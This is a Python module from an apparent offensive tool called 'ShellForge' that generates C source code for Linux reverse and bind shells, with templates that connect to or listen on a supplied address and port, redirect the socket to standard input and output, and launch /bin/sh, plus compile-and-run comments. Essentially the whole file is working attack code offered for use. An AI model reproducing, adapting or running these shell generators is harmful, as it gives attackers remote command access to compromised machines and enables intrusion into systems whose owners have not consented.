"""
C language reverse and bind shell payload generators.

Produces raw .c source that compiles to a reverse/bind shell binary.

Author: Mostafa Tamime
"""

from generators.base import PayloadGenerator


class CGenerator(PayloadGenerator):
    """Standard C socket reverse/bind shells (Linux)."""

    def reverse(self, ip: str, port: int) -> str:
        return self.reverse_script(ip, port)

    def bind(self, port: int) -> str:
        return self.bind_script(port)

    def file_extension(self) -> str:
        return ".c"

    def reverse_script(self, ip: str, port: int) -> str:
        return f"""/*
 * ShellForge C Reverse Shell
 * Author: Mostafa Tamime
 * Compile: gcc -o reverse reverse.c && ./reverse
 * Target: {ip}:{port}
 */

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(void) {{
    int sock;
    struct sockaddr_in attacker;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    attacker.sin_family = AF_INET;
    attacker.sin_port = htons({port});
    attacker.sin_addr.s_addr = inet_addr("{ip}");

    connect(sock, (struct sockaddr *)&attacker, sizeof(attacker));

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    execve("/bin/sh", NULL, NULL);
    return 0;
}}
"""

    def bind_script(self, port: int) -> str:
        return f"""/*
 * ShellForge C Bind Shell
 * Author: Mostafa Tamime
 * Compile: gcc -o bind bind.c && ./bind
 * Port: {port}
 */

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(void) {{
    int sock, client;
    struct sockaddr_in server;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons({port});
    server.sin_addr.s_addr = INADDR_ANY;

    bind(sock, (struct sockaddr *)&server, sizeof(server));
    listen(sock, 0);
    client = accept(sock, NULL, NULL);

    dup2(client, 0);
    dup2(client, 1);
    dup2(client, 2);

    execve("/bin/sh", NULL, NULL);
    return 0;
}}
"""
